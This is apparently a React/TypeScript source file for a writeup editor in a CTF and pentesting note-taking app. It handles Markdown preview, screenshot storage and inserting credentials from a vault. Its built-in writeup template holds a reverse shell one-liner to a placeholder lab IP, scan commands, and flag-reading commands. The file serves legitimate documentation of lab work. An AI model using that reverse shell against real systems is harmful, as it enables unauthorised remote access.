import React, { useState, useEffect, useMemo, useRef, useDeferredValue } from 'react';
import { computeWriteupReadiness } from '../../utils/writeupReadiness';
import { useParams, useNavigate } from 'react-router-dom';
import { motion, AnimatePresence } from 'framer-motion';
import { TACTICAL_SPRING } from '../../utils/motionTokens';
import { confirmAction } from '../../store/useConfirmStore';
import { 
  FileText, 
  Download, 
  Copy, 
  Check, 
  RotateCcw, 
  Code,
  Eye,
  BookOpen,
  FolderGit2,
  Printer,
  X,
  Search,
  Plus,
  Globe,
  Lock,
  ImageOff,
  ListChecks,
  Bold,
  Terminal,
  Table,
  CheckSquare,
  AlertTriangle,
  Image as ImageIcon,
  KeyRound,
  Radar,
  Flag,
  Crown,
  Sparkles,
  Heading2,
  Heading3
} from 'lucide-react';
import { useCtfStore, BRAND_THEMES } from '../../store/useCtfStore';
import { useToastStore } from '../../store/useToastStore';
import { useShallow } from 'zustand/react/shallow';
import { Machine } from '../../types';
import { playCyberSound, interpolateCommand, safeCopyToClipboard } from '../../utils/helpers';
import { downloadWriteupHtml } from '../../utils/writeupHtmlExporter';
import { sanitizeFilename } from '../../utils/workspaceStorage';
import { PentestReportModal } from './PentestReportModal';
import { CptsNoteEntry, searchCptsNotes, getRecommendedNotesForMachine, mergeUserNotePools } from '../../utils/obsidianManualUtils';
import { PlatformIcon } from '../common/PlatformBadge';
import { CyberSelect } from '../common/CyberSelect';
import { PageHeader } from '../common/PageHeader';
import type { OverflowItem } from '../common/PageHeader';
import { CyberButton } from '../common/CyberButton';
import { INLINE_TOKEN_REGEX } from '../../utils/backlinks';
import { IMAGE_URL_SCHEME, compressToWebp, getImage, newImageId, putImage } from '../../utils/imageStore';
import { buildLabSummaryMarkdown } from '../../utils/labMarkdownSummary';
import { BacklinksPanel, buildBacklinkDocs, getBacklinks } from './BacklinksPanel';
import { inlineIndexedDbImages } from '../../utils/imageExportInliner';

// Whole-line pasted screenshot: ![alt](zerobox-img://<id>)
const IMAGE_LINE_REGEX = /^!\[([^\]]*)\]\(zerobox-img:\/\/([A-Za-z0-9_-]+)\)\s*$/;
const IMAGE_ID_REGEX = /zerobox-img:\/\/([A-Za-z0-9_-]+)/g;

/** Resolved object URL per image id; null = not found in the store, absent = still loading. */
type ImageUrlMap = ReadonlyMap<string, string | null>;

/**
 * Resolves `zerobox-img://` ids in the Markdown to object URLs. Every URL created for an id set is
 * revoked when the set changes or the component unmounts.
 */
export const useResolvedImageUrls = (content: string, profileId: string): ImageUrlMap => {
  const idsKey = useMemo(() => {
    if (!content.includes(IMAGE_URL_SCHEME)) return '';
    return Array.from(new Set(Array.from(content.matchAll(IMAGE_ID_REGEX), (m) => m[1]))).sort().join(',');
  }, [content]);
  const [urls, setUrls] = useState<ImageUrlMap>(() => new Map());

  useEffect(() => {
    if (!idsKey) {
      setUrls((prev) => (prev.size === 0 ? prev : new Map()));
      return;
    }
    let cancelled = false;
    const created: string[] = [];
    (async () => {
      const next = new Map<string, string | null>();
      for (const id of idsKey.split(',')) {
        try {
          const blob = await getImage(profileId, id);
          if (cancelled) return;
          if (blob) {
            const url = URL.createObjectURL(blob);
            created.push(url);
            next.set(id, url);
          } else {
            next.set(id, null);
          }
        } catch {
          if (cancelled) return;
          next.set(id, null);
        }
      }
      if (!cancelled) setUrls(next);
    })();
    return () => {
      cancelled = true;
      created.forEach((u) => URL.revokeObjectURL(u));
    };
  }, [idsKey, profileId]);

  return urls;
};

export const renderInlineMarkdown = (text: string, keyPrefix: string | number): React.ReactNode => {
  if (!text) return text;

  // Fast path if text has no markdown formatting characters
  if (!text.includes('[[') && !text.includes('`') && !text.includes('*') && !text.includes('_') && !text.includes('[')) {
    return text;
  }

  // Tokenize: wikilinks, inline code, bold (** or __), links [text](url), italic (* or _)
  const parts = text.split(INLINE_TOKEN_REGEX);

  return parts.map((part, i) => {
    if (!part) return null;
    const subKey = `${keyPrefix}-inl-${i}`;

    // Wikilink
    if (part.startsWith('[[') && part.endsWith(']]')) {
      const raw = part.slice(2, -2);
      const [target, alias] = raw.split('|');
      return (
        <span
          key={subKey}
          className="inline-flex items-center gap-1 px-1.5 py-0.5 rounded bg-surface-sunken border border-subtle text-secondary text-[11px] font-medium mx-0.5"
          title={`Wikilink: ${target.trim()}`}
        >
          <BookOpen className="w-2.5 h-2.5 inline" />
          {alias ? alias.trim() : target.trim()}
        </span>
      );
    }

    // Inline code
    if (part.startsWith('`') && part.endsWith('`') && part.length >= 2) {
      return (
        <code
          key={subKey}
          className="px-1.5 py-0.5 rounded bg-surface-card border border-subtle font-mono text-[11px] text-primary mx-0.5"
        >
          {part.slice(1, -1)}
        </code>
      );
    }

    // Bold (** or __)
    if (
      (part.startsWith('**') && part.endsWith('**') && part.length >= 4) ||
      (part.startsWith('__') && part.endsWith('__') && part.length >= 4)
    ) {
      return (
        <strong key={subKey} className="font-semibold text-primary">
          {part.slice(2, -2)}
        </strong>
      );
    }

    // Link [text](url)
    const linkMatch = part.match(/^\[([^\]]+)\]\((https?:\/\/[^\s)]+)\)$/);
    if (linkMatch) {
      return (
        <a
          key={subKey}
          href={linkMatch[2]}
          target="_blank"
          rel="noopener noreferrer"
          className="text-accent hover:underline inline-flex items-center gap-0.5 font-medium"
        >
          {linkMatch[1]}
        </a>
      );
    }

    // Italic (* or _)
    if (
      (part.startsWith('*') && part.endsWith('*') && part.length >= 2) ||
      (part.startsWith('_') && part.endsWith('_') && part.length >= 2)
    ) {
      return (
        <em key={subKey} className="italic text-secondary">
          {part.slice(1, -1)}
        </em>
      );
    }

    return part;
  });
};

const renderLineWithWikilinks = (text: string, keyPrefix: string | number) => {
  return renderInlineMarkdown(text, keyPrefix);
};

const renderMarkdownPreview = (text: string, imageUrls?: ImageUrlMap) => {
  const lines = text.split('\n');
  let inFrontmatter = false;
  const frontmatterLines: string[] = [];
  let inCodeBlock = false;
  let codeBlockLang = '';
  let codeBlockLines: string[] = [];
  let tableBuffer: string[] = [];

  const elements: React.ReactNode[] = [];

  const flushTable = (keyIdx: number) => {
    if (tableBuffer.length === 0) return;
    const rows = tableBuffer
      .map((r) => r.trim().replace(/^\||\|$/g, '').split('|').map((c) => c.trim()))
      .filter((r) => r.length > 0 && !r.every((cell) => /^:?-+:?$/.test(cell)));

    if (rows.length > 0) {
      const [header, ...body] = rows;
      elements.push(
        <div key={`tbl-${keyIdx}`} className="my-3 overflow-x-auto rounded-lg border border-subtle">
          <table className="w-full text-left border-collapse text-xs">
            <thead className="bg-surface-sunken border-b border-subtle text-secondary">
              <tr>
                {header.map((cell, cIdx) => (
                  <th key={cIdx} className="px-3 py-2 font-semibold">
                    {renderLineWithWikilinks(cell, `th-${keyIdx}-${cIdx}`)}
                  </th>
                ))}
              </tr>
            </thead>
            <tbody className="divide-y divide-subtle bg-surface-card">
              {body.map((row, rIdx) => (
                <tr key={rIdx} className="hover:bg-surface-sunken/60 transition-colors">
                  {row.map((cell, cIdx) => (
                    <td key={cIdx} className="px-3 py-1.5 text-primary font-sans">
                      {renderLineWithWikilinks(cell, `td-${keyIdx}-${rIdx}-${cIdx}`)}
                    </td>
                  ))}
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      );
    }
    tableBuffer = [];
  };

  lines.forEach((line, idx) => {
    // Frontmatter detection
    if (idx === 0 && line.trim() === '---') {
      inFrontmatter = true;
      return;
    }
    if (inFrontmatter) {
      if (line.trim() === '---') {
        inFrontmatter = false;
        elements.push(
          <div key={`fm-${idx}`} className="mb-4 p-3 rounded-lg bg-surface-sunken border border-subtle text-[11px] font-mono text-secondary space-y-0.5">
            <div className="text-[11px] font-semibold text-muted mb-1 flex items-center gap-1">
              <FolderGit2 className="w-3 h-3" /> YAML frontmatter
            </div>
            {frontmatterLines.map((fl, fIdx) => (
              <div key={fIdx}>{fl}</div>
            ))}
          </div>
        );
        return;
      }
      frontmatterLines.push(line);
      return;
    }

    // Codeblock detection
    if (line.startsWith('```')) {
      flushTable(idx);
      if (!inCodeBlock) {
        inCodeBlock = true;
        codeBlockLang = line.replace('```', '').trim();
        codeBlockLines = [];
      } else {
        inCodeBlock = false;
        const rawCmdText = codeBlockLines.join('\n');
        elements.push(
          <div key={`cb-${idx}`} className="my-3 rounded-lg overflow-hidden border border-inverse bg-surface-inverse group relative">
            <div className="bg-surface-inverse-elevated px-3 py-1 text-[11px] text-on-inverse-muted font-mono border-b border-inverse flex items-center justify-between">
              <span>{codeBlockLang || 'shell'}</span>
              <button
                type="button"
                onClick={() => {
                  safeCopyToClipboard(rawCmdText);
                  useToastStore.getState().addToast({ type: 'success', message: 'Copied code block' });
                }}
                className="inline-flex items-center gap-1 px-1.5 py-0.5 rounded bg-surface-card/10 hover:bg-surface-card/20 text-[10px] text-on-inverse cursor-pointer"
                title="Copy code block"
              >
                <Copy className="w-2.5 h-2.5" />
                <span>Copy</span>
              </button>
            </div>
            <pre tabIndex={0} aria-label={codeBlockLang ? `${codeBlockLang} code block` : 'Code block'} className="p-3 text-xs text-on-inverse font-mono overflow-x-auto whitespace-pre-wrap">
              {rawCmdText}
            </pre>
          </div>
        );
      }
      return;
    }

    if (inCodeBlock) {
      codeBlockLines.push(line);
      return;
    }

    // Markdown Table line detection
    if (line.trim().startsWith('|') && line.trim().endsWith('|')) {
      tableBuffer.push(line);
      return;
    } else if (tableBuffer.length > 0) {
      flushTable(idx);
    }

    // Pasted screenshot stored in the local image store
    const imageMatch = line.match(IMAGE_LINE_REGEX);
    if (imageMatch) {
      const url = imageUrls?.get(imageMatch[2]);
      elements.push(
        url ? (
          <img
            key={idx}
            src={url}
            alt={imageMatch[1] || 'screenshot'}
            loading="lazy"
            className="my-2 max-w-full h-auto rounded-lg border border-subtle"
          />
        ) : (
          <div
            key={idx}
            className="my-2 flex items-center gap-2 rounded-lg border border-subtle bg-surface-sunken px-3 py-2 text-[11px] text-muted"
          >
            <ImageOff className="w-3.5 h-3.5" />
            {url === null ? 'Image not found in this browser' : 'Loading image...'}
          </div>
        )
      );
      return;
    }

    // Obsidian Callouts & Blockquotes (> [!NOTE] or > text)
    if (line.startsWith('>')) {
      const cleanQuote = line.replace(/^>\s?/, '');
      const calloutMatch = cleanQuote.match(/^\[!(NOTE|TIP|WARNING|DANGER|INFO)\]\s*(.*)$/i);
      if (calloutMatch) {
        const kind = calloutMatch[1].toUpperCase();
        const title = calloutMatch[2] || kind;
        const styleMap: Record<string, string> = {
          NOTE: 'border-callout-info-border bg-callout-info-bg text-callout-info-fg',
          INFO: 'border-callout-info-border bg-callout-info-bg text-callout-info-fg',
          TIP: 'border-callout-success-border bg-callout-success-bg text-callout-success-fg',
          WARNING: 'border-callout-warn-border bg-callout-warn-bg text-callout-warn-fg',
          DANGER: 'border-callout-danger-border bg-callout-danger-bg text-callout-danger-fg',
        };
        elements.push(
          <div key={idx} className={`my-2 px-3 py-2 rounded-lg border-l-4 text-xs font-semibold ${styleMap[kind] || styleMap.NOTE}`}>
            {renderLineWithWikilinks(title, idx)}
          </div>
        );
      } else {
        elements.push(
          <blockquote key={idx} className="my-1 pl-3 border-l-2 border-accent/50 text-xs text-secondary italic">
            {renderLineWithWikilinks(cleanQuote, idx)}
          </blockquote>
        );
      }
      return;
    }

    // Task Checklists (- [ ] or - [x])
    const taskMatch = line.match(/^-\s+\[([ xX])\]\s+(.*)$/);
    if (taskMatch) {
      const checked = taskMatch[1].toLowerCase() === 'x';
      elements.push(
        <div key={idx} className="flex items-start gap-2 my-1 ml-1 text-xs">
          <input
            type="checkbox"
            checked={checked}
            readOnly
            className="mt-0.5 rounded border-subtle accent-red-500 pointer-events-none"
          />
          <span className={checked ? 'line-through text-muted' : 'text-primary'}>
            {renderLineWithWikilinks(taskMatch[2], idx)}
          </span>
        </div>
      );
      return;
    }

    // Headings
    if (line.startsWith('# ')) {
      elements.push(
        <h1 key={idx} className="text-xl font-semibold text-primary mt-4 mb-2 pb-1 border-b border-subtle">
          {renderLineWithWikilinks(line.replace('# ', ''), idx)}
        </h1>
      );
    } else if (line.startsWith('## ')) {
      elements.push(
        <h2 key={idx} className="text-base font-semibold text-accent mt-4 mb-1.5 flex items-center gap-2">
          {renderLineWithWikilinks(line.replace('## ', ''), idx)}
        </h2>
      );
    } else if (line.startsWith('### ')) {
      elements.push(
        <h3 key={idx} className="text-sm font-semibold text-primary mt-3 mb-1">
          {renderLineWithWikilinks(line.replace('### ', ''), idx)}
        </h3>
      );
    } else if (line.startsWith('---')) {
      elements.push(<hr key={idx} className="my-3 border-subtle" />);
    } else if (line.startsWith('- ')) {
      elements.push(
        <li key={idx} className="ml-4 text-xs text-primary list-disc my-0.5">
          {renderLineWithWikilinks(line.replace('- ', ''), idx)}
        </li>
      );
    } else if (line.trim() === '') {
      elements.push(<div key={idx} className="h-2" />);
    } else {
      elements.push(
        <p key={idx} className="text-xs text-primary leading-relaxed font-sans">
          {renderLineWithWikilinks(line, idx)}
        </p>
      );
    }
  });

  flushTable(lines.length);

  // Group consecutive list items into a real <ul> so <li> always has a list parent.
  const grouped: React.ReactNode[] = [];
  let listBuf: React.ReactElement[] = [];
  const flushList = () => {
    if (listBuf.length > 0) {
      grouped.push(
        <ul key={`ul-${grouped.length}`} className="list-disc">
          {listBuf}
        </ul>
      );
      listBuf = [];
    }
  };
  elements.forEach((el) => {
    if (React.isValidElement(el) && el.type === 'li') {
      listBuf.push(el);
    } else {
      flushList();
      grouped.push(el);
    }
  });
  flushList();

  return grouped;
};

interface DeferredMarkdownPreviewPaneProps {
  content: string;
}

const DeferredMarkdownPreviewPane: React.FC<DeferredMarkdownPreviewPaneProps> = React.memo(({ content }) => {
  const deferredContent = useDeferredValue(content);
  const isStale = deferredContent !== content;

  const profileId = useCtfStore((s) => s.currentProfileId) || 'guest';
  const imageUrls = useResolvedImageUrls(deferredContent, profileId);

  const headings = useMemo(() => {
    return deferredContent
      .split('\n')
      .filter((l) => l.startsWith('## '))
      .map((l) => l.replace('## ', '').trim())
      .slice(0, 6);
  }, [deferredContent]);

  const renderedPreview = useMemo(() => {
    return renderMarkdownPreview(deferredContent, imageUrls);
  }, [deferredContent, imageUrls]);

  return (
    <div
      className={`flex flex-col rounded-xl border border-subtle bg-surface-card machined-edge-subtle overflow-hidden transition-opacity duration-150 ${isStale ? 'opacity-85' : 'opacity-100'}`}
      style={{ contain: 'content' }}
    >
      <div className="flex flex-wrap items-center justify-between gap-2 border-b border-subtle px-4 py-2.5 bg-surface-sunken text-xs">
        <span className="font-semibold text-primary flex items-center gap-2">
          <Eye className="w-4 h-4 text-accent" /> Preview
        </span>
        <div className="flex items-center gap-1.5 flex-wrap">
          {headings.length > 0 && (
            <div className="hidden xl:flex items-center gap-1">
              {headings.map((h, i) => (
                <span
                  key={i}
                  className="px-1.5 py-0.5 rounded bg-surface-card border border-subtle text-[10px] text-secondary truncate max-w-[110px]"
                  title={h}
                >
                  {h}
                </span>
              ))}
            </div>
          )}
          {isStale && (
            <span className="text-[11px] px-1.5 py-0.5 rounded bg-surface-card text-muted border border-subtle">
              Syncing
            </span>
          )}
        </div>
      </div>

      <div tabIndex={0} role="region" aria-label="Rendered markdown preview" className="flex-1 p-5 overflow-y-auto max-h-[calc(100vh-280px)] bg-surface-card">
        {renderedPreview}
      </div>
    </div>
  );
});

export const computeWriteupTelemetry = (text: string) => {
  const trimmed = text.trim();
  return {
    chars: text.length,
    words: trimmed ? trimmed.split(/\s+/).length : 0,
    lines: text.split('\n').length,
  };
};

/**
 * Machine the studio opens on: the route id (`/writeup/:id`) wins outright; otherwise the active
 * target when the selector lists it (retired machines only); otherwise the first retired machine,
 * then the first machine.
 */
export const pickWriteupMachine = <M extends { id: string; isActive?: boolean }>(
  machines: readonly M[],
  pickedId: string | null,
  activeTargetId: string | null
): M => {
  const retired = machines.filter((m) => !m.isActive);
  return (
    (pickedId ? machines.find((m) => m.id === pickedId) : undefined) ||
    (activeTargetId ? retired.find((m) => m.id === activeTargetId) : undefined) ||
    retired[0] ||
    machines[0]
  );
};

export const WriteupStudio: React.FC = () => {
  const { id } = useParams<{ id: string }>();
  const navigate = useNavigate();
  const {
    machines,
    activeTargetId,
    setWriteupMachineId,
    updateMachine,
    toggleUserFlag,
    toggleRootFlag,
    soundEnabled,
    globalVars,
    appBrand,
    isDeepStorageLoaded,
    customNotes,
    userNotes,
    credentials,
    cheatsheets,
    currentProfileId,
  } = useCtfStore(
    useShallow((s) => ({
      customNotes: s.customNotes,
      userNotes: s.userNotes,
      credentials: s.credentials,
      cheatsheets: s.cheatsheets,
      currentProfileId: s.currentProfileId,
      machines: s.machines,
      activeTargetId: s.activeTargetId,
      setWriteupMachineId: s.setWriteupMachineId,
      updateMachine: s.updateMachine,
      toggleUserFlag: s.toggleUserFlag,
      toggleRootFlag: s.toggleRootFlag,
      soundEnabled: s.soundEnabled,
      globalVars: s.globalVars,
      appBrand: s.appBrand,
      isDeepStorageLoaded: s.isDeepStorageLoaded,
    }))
  );

  useEffect(() => {
    if (id && machines.some((m) => m.id === id)) {
      setWriteupMachineId(id);
    }
  }, [id, machines, setWriteupMachineId]);

  const retiredMachines = useMemo(() => machines.filter((m) => !m.isActive), [machines]);
  const selectedMachine = pickWriteupMachine(machines, id ?? null, activeTargetId);

  const [copied, setCopied] = useState(false);
  const [reportModalOpen, setReportModalOpen] = useState(false);
  const [editorContent, setEditorContent] = useState('');
  const [cptsDrawerOpen, setCptsDrawerOpen] = useState(false);
  const [cptsSearch, setCptsSearch] = useState('');
  const [debouncedSearch, setDebouncedSearch] = useState('');
  const [studioLayout, setStudioLayout] = useState<'split' | 'editor' | 'preview'>('split');
  const [nmapPopoverOpen, setNmapPopoverOpen] = useState(false);
  const [rawNmapText, setRawNmapText] = useState('');
  const [snippetPopoverOpen, setSnippetPopoverOpen] = useState(false);
  const [snippetQuery, setSnippetQuery] = useState('');
  const fileInputRef = useRef<HTMLInputElement>(null);

  // Debounce search query by 150ms to maintain 120 FPS
  useEffect(() => {
    const timer = setTimeout(() => {
      setDebouncedSearch(cptsSearch);
    }, 150);
    return () => clearTimeout(timer);
  }, [cptsSearch]);

  const userNotePool = useMemo(() => mergeUserNotePools(customNotes, userNotes), [customNotes, userNotes]);
  const hasUserNotes = userNotePool.length > 0;
  const matchingNotes = useMemo(() => {
    if (userNotePool.length === 0) return [];
    if (!debouncedSearch.trim()) {
      return selectedMachine
        ? getRecommendedNotesForMachine(selectedMachine, 20, userNotePool)
        : userNotePool.slice(0, 20);
    }
    return searchCptsNotes(debouncedSearch, 'ALL', null, userNotePool).slice(0, 20);
  }, [debouncedSearch, selectedMachine, userNotePool]);

  const filteredSnippets = useMemo(() => {
    const q = snippetQuery.trim().toLowerCase();
    if (!q) return cheatsheets.slice(0, 8);
    return cheatsheets
      .filter(
        (c) =>
          c.title.toLowerCase().includes(q) ||
          c.commandTemplate.toLowerCase().includes(q) ||
          c.category.toLowerCase().includes(q)
      )
      .slice(0, 8);
  }, [cheatsheets, snippetQuery]);

  const handleInsertNote = (note: CptsNoteEntry) => {
    if (!selectedMachine) return;
    const targetVars = { ...globalVars, targetIp: selectedMachine.ip || '' };
    const cmdsFormatted = note.commands && note.commands.length > 0
      ? `\n\`\`\`bash\n# ${note.title}\n${note.commands.map(c => interpolateCommand(c, targetVars)).join('\n')}\n\`\`\`\n`
      : '';

    const snippet = `\n\n---\n\n### 📚 Field Manual: ${note.title}\n> **Category:** ${note.category} | **Difficulty:** ${note.difficulty}\n> ${note.summary || note.subCategory}\n${cmdsFormatted}`;

    const updated = editorContent + snippet;
    setEditorContent(updated);
    updateMachine(selectedMachine.id, { writeupMarkdown: updated });
    if (soundEnabled) playCyberSound('root');
  };

  // Generate standardized template with YAML frontmatter for Obsidian / GitBook
  const generateTemplate = (m: Machine): string => {
    const today = new Date().toISOString().slice(0, 10);
    const tagsList = m.tags.length > 0 ? m.tags.join(', ') : 'ctf, pentest, writeup';

    return `---
title: "${m.platform || 'CTF'} Writeup - ${m.name}"
target_ip: "${m.ip}"
platform: "${m.platform}"
os: "${m.os}"
difficulty: "${m.difficulty}"
status: "${m.status}"
user_flag: "${m.userFlag || 'FLAG{...}'}"
root_flag: "${m.rootFlag || 'FLAG{...}'}"
time_spent: "${Math.round(m.timeSpentSeconds / 60)} minutes"
tags: [${tagsList}]
date: "${today}"
author: "ZeroBox Operator"
---

# ${m.name} - Writeup & Penetration Testing Report
**Target IP:** \`${m.ip}\` | **OS:** ${m.os} | **Platform:** ${m.platform} | **Difficulty:** ${m.difficulty}

---

## 1. Executive Summary & Difficulty Breakdown
- **Initial Foothold Vector:** [Brief summary of initial vulnerability, e.g. SQL Injection / LFI / Deserialization]
- **Privilege Escalation Vector:** [Brief summary of root escalation, e.g. SUID binary / Sudo misconfiguration / ADCS]
- **Perceived Rating:** ${m.difficulty} (Official) vs ${m.perceivedDifficulty || m.difficulty} (Perceived)

---

## 2. Reconnaissance & Nmap Scan Results
### TCP All-Ports Scan
\`\`\`bash
# Fast SYN and Service Version Detection
nmap -sC -sV -Pn --min-rate 2000 -oN nmap_quick.txt ${m.ip}
\`\`\`

### Discovered Services:
| Port | Service | Version | Notes / Attack Surface |
| :--- | :--- | :--- | :--- |
| 22/tcp | ssh | OpenSSH 8.4p1 | Check banner & key auth |
| 80/tcp | http | Apache 2.4.41 | Enumerate vhosts & endpoints |

### Web Directory & Endpoint Fuzzing
\`\`\`bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://${m.ip}/FUZZ -ac
\`\`\`

---

## 3. Vulnerability Analysis & Foothold Exploitation
### Discovery:
[Detail the attack vector found during enumeration]

### Exploitation Proof-of-Concept:
\`\`\`bash
# Reverse Shell or Exploit Execution
bash -i >& /dev/tcp/10.10.14.X/4444 0>&1
\`\`\`

### User Flag Loot:
\`\`\`bash
cat /home/*/user.txt
# Flag: ${m.userFlag || 'FLAG{...}'}
\`\`\`

---

## 4. Privilege Escalation & Proof of Concept
### Internal Enumeration:
- [ ] Run LinPEAS / WinPEAS automated audit
- [ ] Check SUID / Sudo permissions (\`sudo -l\`)
\`\`\`bash
sudo -l
\`\`\`

### Root Escalation:
[Explain escalation path step by step]

### Root / System Flag:
\`\`\`bash
cat /root/root.txt
# Flag: ${m.rootFlag || 'FLAG{...}'}
\`\`\`

---

## 5. Post-Exploitation Loot & Lessons Learned
- **Key Takeaway 1:** Always inspect source comments for credential leaks.
- **Key Takeaway 2:** Validate wildcard expansions in scheduled crontabs.
- **Mitigation:** Patch vulnerable services, restrict sudoers configuration, and apply least privilege principles.
`;
  };

  // Debounce refs for fluid, 120 FPS typing in the editor
  const debounceTimerRef = useRef<any>(null);
  const pendingMachineIdRef = useRef<string | null>(null);
  const pendingContentRef = useRef<string>('');

  const flushDebouncedSave = () => {
    if (debounceTimerRef.current) {
      clearTimeout(debounceTimerRef.current);
      debounceTimerRef.current = null;
    }
    if (pendingMachineIdRef.current && pendingContentRef.current !== '') {
      updateMachine(pendingMachineIdRef.current, { writeupMarkdown: pendingContentRef.current });
      pendingMachineIdRef.current = null;
    }
  };

  useEffect(() => {
    return () => {
      flushDebouncedSave();
    };
  }, []);

  useEffect(() => {
    if (!selectedMachine) return;

    if (selectedMachine.isActive) {
      flushDebouncedSave();
      setEditorContent('');
      return;
    }

    if (selectedMachine.writeupMarkdown) {
      flushDebouncedSave();
      setEditorContent(selectedMachine.writeupMarkdown);
      return;
    }

    if (isDeepStorageLoaded && !selectedMachine.writeupMarkdown) {
      flushDebouncedSave();
      const tmpl = generateTemplate(selectedMachine);
      // Show the template without saving it: opening a machine must not count as an unexported change.
      // The first edit or insert saves the full editor content (template included).
      editorContentRef.current = tmpl;
      setEditorContent(tmpl);
    }
  }, [selectedMachine?.id, selectedMachine?.writeupMarkdown, selectedMachine?.isActive, isDeepStorageLoaded]);

  const telemetry = useMemo(() => computeWriteupTelemetry(editorContent), [editorContent]);

  // Writeup Completeness & Quality Readiness Meter
  const readiness = useMemo(
    () => computeWriteupReadiness(editorContent, selectedMachine ? generateTemplate(selectedMachine) : ''),
    // eslint-disable-next-line react-hooks/exhaustive-deps
    [editorContent, selectedMachine],
  );

  const handleEditorChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
    const val = e.target.value;
    setEditorContent(val);
    if (selectedMachine) {
      pendingMachineIdRef.current = selectedMachine.id;
      pendingContentRef.current = val;
      if (debounceTimerRef.current) {
        clearTimeout(debounceTimerRef.current);
      }
      debounceTimerRef.current = setTimeout(() => {
        if (selectedMachine) {
          updateMachine(selectedMachine.id, { writeupMarkdown: val });
          pendingMachineIdRef.current = null;
        }
      }, 400);
    }
  };

  const editorRef = useRef<HTMLTextAreaElement>(null);
  const editorContentRef = useRef('');
  editorContentRef.current = editorContent;
  const selectedMachineIdRef = useRef<string | undefined>(undefined);
  selectedMachineIdRef.current = selectedMachine?.id;
  const profileId = currentProfileId || 'guest';

  // Insert at the textarea cursor (or replace its selection); appends when the editor never had focus.
  const insertAtCursor = (snippet: string, range?: { start: number; end: number }) => {
    if (!selectedMachine || selectedMachine.isActive) return;
    const current = editorContentRef.current;
    const el = editorRef.current;
    const start = Math.min(range?.start ?? el?.selectionStart ?? current.length, current.length);
    const end = Math.min(range?.end ?? el?.selectionEnd ?? start, current.length);
    const updated = current.slice(0, start) + snippet + current.slice(end);
    if (debounceTimerRef.current) {
      clearTimeout(debounceTimerRef.current);
      debounceTimerRef.current = null;
    }
    pendingMachineIdRef.current = null;
    editorContentRef.current = updated;
    setEditorContent(updated);
    updateMachine(selectedMachine.id, { writeupMarkdown: updated });
    const caret = start + snippet.length;
    requestAnimationFrame(() => {
      const target = editorRef.current;
      if (!target) return;
      target.focus();
      target.setSelectionRange(caret, caret);
    });
  };

  // Pull Field Log from Notes Workspace or Machine Quick Notes
  const handlePullFieldLog = () => {
    if (!selectedMachine) return;
    const targetLower = selectedMachine.name.toLowerCase();
    const boundNote =
      customNotes.find((n) => n.title.toLowerCase().includes(targetLower)) ||
      userNotes.find((n) => n.title.toLowerCase().includes(targetLower));

    const quick = selectedMachine.quickNotes?.trim();
    if (!boundNote && !quick) {
      useToastStore.getState().addToast({
        type: 'info',
        message: `No Field Log or Quick Notes found for ${selectedMachine.name} yet`,
      });
      return;
    }

    const parts: string[] = [];
    if (boundNote?.rawMarkdown) {
      parts.push(`\n\n---\n\n## Imported Field Log (${boundNote.title})\n\n${boundNote.rawMarkdown.trim()}`);
    }
    if (quick) {
      parts.push(`\n\n---\n\n## Imported Quick Notes\n\n${quick}`);
    }
    insertAtCursor(parts.join('\n') + '\n');
    if (soundEnabled) playCyberSound('root');
    useToastStore.getState().addToast({
      type: 'success',
      message: `Pulled Field Log into ${selectedMachine.name} writeup`,
    });
  };

  // Insert Captured Credentials from Vault
  const handleInsertVaultLoot = () => {
    if (!selectedMachine) return;
    const pool = credentials.filter((c) => c.sourceMachineId === selectedMachine.id);
    if (pool.length === 0) {
      useToastStore.getState().addToast({
        type: 'info',
        message: `No credentials captured for ${selectedMachine.name} yet. Use "+ Loot" to capture credentials first.`,
      });
      return;
    }
    const rows = pool.map(
      (c) => `| \`${c.username}\` | \`${c.secret}\` | ${c.type} | ${c.notes || selectedMachine.name} |`
    );
    const tableMd = `\n\n### Captured Credentials & Loot\n| Username | Secret / Hash | Type | Notes |\n| :--- | :--- | :--- | :--- |\n${rows.join('\n')}\n`;
    insertAtCursor(tableMd);
    if (soundEnabled) playCyberSound('root');
    useToastStore.getState().addToast({
      type: 'success',
      message: `Inserted ${pool.length} credential(s) from Vault`,
    });
  };

  // Handle Screenshot File Upload Button
  const handleImageFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    e.target.value = '';
    if (!file || !selectedMachine || selectedMachine.isActive) return;
    const machineId = selectedMachine.id;
    void (async () => {
      try {
        const compressed = await compressToWebp(file);
        const imageId = newImageId();
        await putImage(profileId, imageId, compressed);
        if (selectedMachineIdRef.current !== machineId) return;
        insertAtCursor(`\n![screenshot](${IMAGE_URL_SCHEME}${imageId})\n`);
        if (soundEnabled) playCyberSound('root');
        useToastStore.getState().addToast({
          type: 'success',
          message: 'Screenshot compressed to WebP & embedded in writeup',
        });
      } catch (err) {
        console.warn('Could not store uploaded image', err);
      }
    })();
  };

  const labSummary = useMemo(
    () => (selectedMachine && !selectedMachine.isActive ? buildLabSummaryMarkdown(selectedMachine) : ''),
    [selectedMachine]
  );

  const handleInsertLabSummary = (markdown: string = labSummary) => {
    if (!markdown) return;
    const current = editorContentRef.current;
    const pos = Math.min(editorRef.current?.selectionStart ?? current.length, current.length);
    const before = current.slice(0, pos);
    const lead = before === '' || before.endsWith('\n\n') ? '' : before.endsWith('\n') ? '\n' : '\n\n';
    insertAtCursor(`${lead}${markdown}\n\n`, { start: pos, end: pos });
    if (soundEnabled) playCyberSound('root');
  };

  const handlePaste = (e: React.ClipboardEvent<HTMLTextAreaElement>) => {
    const items = Array.from(e.clipboardData?.items ?? []);
    if (items.some((it) => it.kind === 'string' && it.type === 'text/plain')) return;
    const imageItem = items.find((it) => it.kind === 'file' && it.type.startsWith('image/'));
    const file = imageItem?.getAsFile();
    if (!file || !selectedMachine || selectedMachine.isActive) return;

    e.preventDefault();
    const machineId = selectedMachine.id;
    const range = { start: e.currentTarget.selectionStart, end: e.currentTarget.selectionEnd };
    void (async () => {
      try {
        const compressed = await compressToWebp(file);
        const imageId = newImageId();
        await putImage(profileId, imageId, compressed);
        if (selectedMachineIdRef.current !== machineId) return;
        insertAtCursor(`![screenshot](${IMAGE_URL_SCHEME}${imageId})`, range);
      } catch (err) {
        console.warn('Could not store pasted image', err);
      }
    })();
  };

  const backlinkDocs = useMemo(() => buildBacklinkDocs(userNotePool, machines), [userNotePool, machines]);
  const backlinks = useMemo(
